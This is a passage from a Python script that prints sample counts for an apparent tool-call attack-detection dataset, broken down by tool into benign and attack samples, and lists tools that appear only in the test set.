                     for v in test.values())

    print(f"\nTraining dataset: {len(train)} tools, {train_count} samples")
    print(f"Test dataset: {len(test)} tools, {test_count} samples")

    print("\nTraining dataset breakdown:")
    for tool, data in sorted(train.items()):
        print(f"  {tool}: {len(data.get('benign', []))} benign, {len(data.get('attack', []))} attack")

    # List new tools in test
    new_tools = ['graphql_query', 'ldap_query', 'parse_xml', 'redis_command',
                 'verify_jwt', 's3_operation', 'send_webhook', 'render_template', 'deserialize_data']
    print(f"\nNew zero-day tools in test dataset:")
    for tool in new_tools:
        if tool in test:
            benign = len(test[tool].get('benign', []))
            attack = len(test[tool].get('attack', []))
            print(f"  - {tool}: {benign} benign, {attack} attack")

if __name__ == '__main__':
    main()
